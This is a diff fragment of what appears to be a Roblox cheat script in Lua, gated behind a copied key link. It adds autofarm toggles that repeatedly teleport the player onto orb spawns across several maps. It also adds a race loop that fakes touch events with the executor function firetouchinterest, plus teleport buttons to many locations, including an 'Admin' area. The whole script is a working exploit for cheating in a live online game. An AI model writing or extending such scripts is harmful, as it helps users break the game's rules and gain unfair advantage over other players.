+                                for _, orbName in ipairs({"Old1", "Old2"}) do
+                                    local orb = spawner:FindFirstChild(orbName)
+                                    if orb and orb:FindFirstChild("Core") then
+                                        local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                        if humanoidRootPart then
+                                            humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                            wait(0.10)
+                                        else
+                                            print("Error: HumanoidRootPart not found in local player's character.")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    wait(10) 
+                end
+            else
+                print("Autofarm disabled for Original Map")
+            end
+        end)
+        
+        local volcanoMapLabel = autofarmTab:CreateLabel("Volcano Map")
+        
+        local autofarm5Toggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm4 = state
+            if state then
+                print("Autofarm enabled for Volcano Map")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1270, 258.594482, 2022)
+                task.wait(0.3) 
+                while getgenv().autofarm4 do
+                    pcall(function()
+                        for _, spawner in ipairs(game.workspace.VolcanoMap.Spawners:GetChildren()) do
+                            if spawner:IsA("Part") then
+                                for _, orbName in ipairs({"Volcano1", "Volcano2", "Volcano3", "ShadowOrb"}) do
+                                    local orb = spawner:FindFirstChild(orbName)
+                                    if orb and orb:FindFirstChild("Core") then
+                                        local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                        if humanoidRootPart then
+                                            humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                            wait(0.10)
+                                        else
+                                            print("Error: HumanoidRootPart not found in local player's character.")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    wait(10)
+                end
+            else
+                print("Autofarm disabled for Volcano Map")
+            end
+        end)
+        
+        local beachMapLabel = autofarmTab:CreateLabel("Beach Map")
+        
+        local autofarm6Toggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm5 = state
+            if state then
+                print("Autofarm enabled for Beach Map")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3624.00562, 67.7395248, 1018.45709)
+                task.wait(0.3) 
+                while getgenv().autofarm5 do
+                    pcall(function()
+                        for _, spawner in ipairs(game.workspace.BeachMap.Spawners:GetChildren()) do
+                            if spawner:IsA("Part") then
+                                for _, orbName in ipairs({"Beach1", "Beach2", "Beach3", "ShadowOrb"}) do
+                                    local orb = spawner:FindFirstChild(orbName)
+                                    if orb and orb:FindFirstChild("Core") then
+                                        local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                        if humanoidRootPart then
+                                            humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                            wait(0.10)
+                                        else
+                                            print("Error: HumanoidRootPart not found in local player's character.")
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end)
+                    wait(10)
+                end
+            else
+                print("Autofarm disabled for Beach Map")
+            end
+        end)
+        
+        local ghostCityLabel = autofarmTab:CreateLabel("Ghost City")
+        
+        local autofarm7Toggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm6 = state
+            if state then
+                print("Autofarm enabled for Ghost City")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3825.7041, -33.801918, 7304.7002)
+                task.wait(0.3)  
+                while getgenv().autofarm6 do
+                    pcall(function()
+                        local ghostOrbsMega = game:GetService("Workspace").GhostCity.GhostOrbsMega
+                        if ghostOrbsMega then
+                            for _, orbName in ipairs({"GhostMega", "GhostMega2"}) do
+                                local orb = ghostOrbsMega:FindFirstChild(orbName)
+                                if orb and orb:FindFirstChild("Core") then
+                                    local humanoidRootPart = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                                    if humanoidRootPart then
+                                        humanoidRootPart.CFrame = CFrame.new(orb.Core.Position)
+                                        wait(0.10)
+                                    else
+                                        print("Error: HumanoidRootPart not found in local player's character.")
+                                    end
+                                end
+                            end
+                        else
+                            print("Error: Ghost Orbs Mega not found.")
+                        end
+                    end)
+                    wait(10) 
+                end
+            else
+                print("Autofarm disabled for Ghost City")
+            end
+        end)
+        
+        local raceMapLabel = autofarmTab:CreateLabel("Race Map")
+        
+        local raceMapToggle = autofarmTab:CreateToggle("Autofarm", function(state)
+            getgenv().autofarm7 = state
+            if state then
+                print("Autofarm enabled for Race Map")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 30.9980049, 0) -- Teleport to Main Map initially
+                while true do
+                    firetouchinterest(game.Players.LocalPlayer.Character.Head, workspace.MainMap[""], 0)
+                    wait(5)
+                    while true do
+                        wait(15.1)
+                        if workspace.RaceMap.City and workspace.RaceMap.City.Finish then
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.RaceMap.City.Finish.Position)
+                        end
+                        if workspace.RaceMap.Plastic and workspace.RaceMap.Plastic.Finish then
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.RaceMap.Plastic.Finish.Position)
+                        end
+                    end
+                end
+            else
+                print("Autofarm disabled for Race Map")
+            end
+        end)
+        
+        local teleportTab = main:CreateTab("Teleportation")
+        
+        local mainMapTeleportButton = teleportTab:CreateButton("Main city", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 30.9980049, 0)
+        end)
+
+        local EliteTeleportButton = teleportTab:CreateButton("Elite city", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1751, 12.699995994567871, 1751)
+        end)
+        
+        local winterTeleportButton = teleportTab:CreateButton("Winter", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4680.05566, 1799.30164, -2813.43042)
+        end)
+        
+        local originalMapTeleportButton = teleportTab:CreateButton("Original Map", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2388, 2742.4978, 390)
+        end)
+        
+        local volcanoMapTeleportButton = teleportTab:CreateButton("Volcano", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1270, 258.594482, 2022)
+        end)
+        
+        local beachMapTeleportButton = teleportTab:CreateButton("Beach", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3624.00562, 67.7395248, 1018.45709)
+        end)
+        
+        local ghostCityTeleportButton = teleportTab:CreateButton("Ghost City", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3825.7041, -33.801918, 7304.7002)
+        end)
+        
+        local InfiniteRoadTeleportButton = teleportTab:CreateButton("Infinite Road", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-22, 1549.717529296875, -1927)
+        end)
+
+        local UnderUFOTeleportButton = teleportTab:CreateButton("Under UFO", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2465.26806640625, 2797.198974609375, -150.5103759765625)
+        end)
+
+        local AdminTeleportButton = teleportTab:CreateButton("Admin", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1527, 231.34007263183594, -9961)
+        end)
+
+        local DarkTeleportButton = teleportTab:CreateButton("Dark Dimension", function()
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4966.94921875, 410.0472106933594, -5954.06298828125)
+        end)
+    end,
+ })
+else
+    print("Key is invalid, Please copy the key link from the button!")
+end
+end)
+
+local button = Section:NewButton("Copy Key Link", "Copies the key link to your clipboard", function()
+    local link = plato.getLink()
+    setclipboard(link)
+end)
